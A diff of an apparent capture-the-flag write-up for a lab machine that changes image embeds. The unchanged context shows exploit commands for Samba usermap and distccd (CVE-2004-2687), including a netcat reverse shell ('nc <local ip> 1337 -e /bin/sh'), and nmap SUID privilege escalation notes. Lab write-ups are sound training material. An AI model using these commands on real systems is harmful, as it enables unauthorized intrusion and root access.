@@ -163,7 +163,7 @@ user:[uucp] rid:[0x3fc]
 `kali@kali:/$ ./usermap_script.py 10.10.10.3 139 10.10.14.13 3333`
 
 <img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.36.35 PM.png" width=50% height=50%>
-![[Screen Shot 2022-12-19 at 10.37.01 PM.png|500]]
+<img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.37.01 PM.png" width=50% height=50%>
 
 ##### Exploitation #2: CVE-2004-2687
 
@@ -171,8 +171,8 @@ user:[uucp] rid:[0x3fc]
 
 `kali@kali:/$ ./disccd_exploit.py -t <victim ip> -p 3632 -c "nc <local ip> 1337 -e /bin/sh"`
 
-![[Screen Shot 2022-12-19 at 10.50.26 PM.png|500]]
-![[Screen Shot 2022-12-19 at 10.51.21 PM.png|500]]
+<img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.50.26 PM.png" width=50% height=50%>
+<img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.51.21 PM.png" width=50% height=50%>
 
 ##### Privilege Escalation w/ Exploitation #2
 
@@ -182,7 +182,7 @@ Important SUID files:
 - The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands with root privileges due to owner being root
 - [GTFOBins]( https://gtfobins.github.io/gtfobins/nmap/)
 
-![[Screen Shot 2022-12-19 at 11.20.34 PM.png|480]]
+<img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 11.20.34 PM.png" width=50% height=50%>
 
 
 
